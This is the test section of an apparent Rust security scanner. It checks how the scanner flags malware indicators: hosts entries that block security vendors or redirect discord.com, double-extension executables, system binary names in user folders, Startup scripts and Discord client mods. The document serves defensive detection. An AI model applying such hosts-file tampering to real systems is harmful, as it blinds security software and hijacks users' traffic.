"#;
        assert!(analyze_hosts(stock).is_empty());
    }

    #[test]
    fn explicit_loopback_localhost_entries_are_still_silent() {
        let content = "127.0.0.1 localhost\n::1 localhost\n";
        assert!(analyze_hosts(content).is_empty());
    }

    #[test]
    fn hosts_entries_blocking_security_vendors_are_critical() {
        let content = "# comment\n\
             127.0.0.1 www.malwarebytes.com\n\
             0.0.0.0 update.microsoft.com\n";
        let f = analyze_hosts(content);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].id, "integrity-hosts-security-blocked");
        assert_eq!(f[0].severity, Severity::Critical);
        assert_eq!(f[0].remediation, Some(Remediation::ResetHostsFile));
        assert_eq!(f[0].evidence.len(), 2);
    }

    #[test]
    fn hosts_entries_redirecting_discord_are_high() {
        let content = "185.199.108.153 discord.com api.discord.com\n";
        let f = analyze_hosts(content);
        assert_eq!(f[0].id, "integrity-hosts-discord");
        assert_eq!(f[0].severity, Severity::High);
    }

    #[test]
    fn unrelated_custom_hosts_entries_are_only_informational() {
        let content = "127.0.0.1 my-dev-site.local\n192.168.1.5 nas\n";
        let f = analyze_hosts(content);
        assert_eq!(f.len(), 1);
        assert_eq!(f[0].severity, Severity::Low);
        assert!(f[0].title.contains('2'));
    }

    #[test]
    fn hosts_parsing_handles_tabs_and_trailing_comments() {
        let entries = parse_hosts("\t127.0.0.1\tfoo.local\tbar.local # dev\n\n   \n");
        assert_eq!(entries.len(), 1);
        assert_eq!(entries[0].ip, "127.0.0.1");
        assert_eq!(entries[0].hosts, vec!["foo.local", "bar.local"]);
        assert_eq!(entries[0].line_no, 1);
    }

    #[test]
    fn extension_manifests_parse_including_placeholder_names() {
        let (name, version) =
            parse_extension_manifest(r#"{"name":"uBlock Origin","version":"1.57.0"}"#).unwrap();
        assert_eq!(name, "uBlock Origin");
        assert_eq!(version, "1.57.0");

        let (name, version) =
            parse_extension_manifest(r#"{"name":"__MSG_extName__","manifest_version":3}"#).unwrap();
        assert_eq!(name, "__MSG_extName__");
        assert_eq!(version, "?");

        assert!(parse_extension_manifest("not json").is_none());
        assert!(parse_extension_manifest(r#"{"version":"1"}"#).is_none());
    }

    #[test]
    fn the_extension_inventory_is_informational() {
        let exts = vec![BrowserExtension {
            browser: "Chrome".into(),
            profile: "Default".into(),
            id: "cjpalhdlnbpafiamejdnhcphjbkeiagm".into(),
            name: "uBlock Origin".into(),
            version: "1.57.0".into(),
        }];
        let f = analyze_extensions(&exts);
        assert_eq!(f[0].severity, Severity::Info);
        assert!(f[0].evidence[0].contains("cjpalhdlnbpafiamejdnhcphjbkeiagm"));
        assert!(analyze_extensions(&[]).is_empty());
    }

    #[test]
    fn system_binary_names_in_user_directories_are_critical() {
        let (sev, why) =
            classify_dropped_file("svchost.exe", 1, DropLocation::AppData).unwrap();
        assert_eq!(sev, Severity::Critical);
        assert!(why.contains("System32"));
    }

    #[test]
    fn double_extensions_are_high() {
        let (sev, _) = classify_dropped_file("invoice.pdf.exe", 3, DropLocation::Temp).unwrap();
        assert_eq!(sev, Severity::High);
        let (sev, _) = classify_dropped_file("photo.jpg.scr", 3, DropLocation::Temp).unwrap();
        assert_eq!(sev, Severity::High);
        // A dot in a version number is not a double extension: it falls
        // through to the ordinary "new exe in %TEMP%" case, which is Watching.
        let (sev, _) = classify_dropped_file("setup.1.2.3.exe", 1, DropLocation::Temp).unwrap();
        assert_eq!(sev, Severity::Info);
    }

    #[test]
    fn ordinary_temp_executables_are_watched_and_only_when_recent() {
        // Info, not Low: every installer and updater writes an .exe to %TEMP%,
        // so scoring these produced ~26 findings on a machine with nothing
        // wrong with it. Reported for recognition, not as a problem.
        assert_eq!(
            classify_dropped_file("vcredist_x64.exe", 2, DropLocation::Temp)
                .unwrap()
                .0,
            Severity::Info
        );
        assert!(classify_dropped_file("vcredist_x64.exe", 400, DropLocation::Temp).is_none());
        // The same file in AppData is not interesting on its own — half of
        // Windows software installs there.
        assert!(classify_dropped_file("app.exe", 1, DropLocation::LocalAppData).is_none());
    }

    #[test]
    fn scripts_in_startup_are_high_but_documents_are_ignored() {
        assert_eq!(
            classify_dropped_file("run.ps1", 100, DropLocation::Startup)
                .unwrap()
                .0,
            Severity::High
        );
        assert!(classify_dropped_file("notes.txt", 1, DropLocation::Startup).is_none());
    }

    #[test]
    fn dropped_file_findings_offer_quarantine() {
        let files = vec![DroppedFile {
            path: r"C:\Users\bob\AppData\Local\Temp\invoice.pdf.exe".into(),
            age_days: 2,
            location: DropLocation::Temp,
        }];
        let f = analyze_dropped_files(&files);
        assert_eq!(
            f[0].remediation,
            Some(Remediation::DeleteFile {
                path: r"C:\Users\bob\AppData\Local\Temp\invoice.pdf.exe".into()
            })
        );
    }

    #[test]
    fn client_mods_are_reported_with_lightcord_escalated() {
        let mods = vec![ClientMod {
            name: "Vencord".into(),
            path: r"C:\Users\bob\AppData\Roaming\Vencord".into(),
        }];
        assert_eq!(analyze_client_mods(&mods)[0].severity, Severity::Medium);

        let mods = vec![ClientMod {
            name: "Lightcord".into(),
            path: r"C:\Users\bob\AppData\Roaming\Lightcord".into(),
        }];
        assert_eq!(analyze_client_mods(&mods)[0].severity, Severity::High);
        assert!(analyze_client_mods(&[]).is_empty());
    }

    #[test]
    fn file_names_are_extracted_from_either_separator() {
        assert_eq!(file_name_of(r"C:\a\b\c.exe"), "c.exe");
        assert_eq!(file_name_of("/a/b/c.exe"), "c.exe");
        assert_eq!(file_name_of("c.exe"), "c.exe");
    }

    #[test]
    fn walking_a_temp_dir_respects_the_file_cap() {
        let dir = std::env::temp_dir().join("odysync-security-walk-test");
        let _ = std::fs::create_dir_all(dir.join("nested"));
        let _ = std::fs::write(dir.join("a.exe"), b"x");
        let _ = std::fs::write(dir.join("nested").join("b.exe"), b"x");

        let all = walk_files(&dir, 2, 100, &|p| {
            p.extension().and_then(|e| e.to_str()) == Some("exe")
        });
        assert_eq!(all.len(), 2);

        let capped = walk_files(&dir, 2, 1, &|_| true);
        assert_eq!(capped.len(), 1);

        let shallow = walk_files(&dir, 0, 100, &|p| {
            p.extension().and_then(|e| e.to_str()) == Some("exe")
        });
        assert_eq!(shallow.len(), 1, "depth 0 must not descend");

        let _ = std::fs::remove_dir_all(&dir);
    }
}
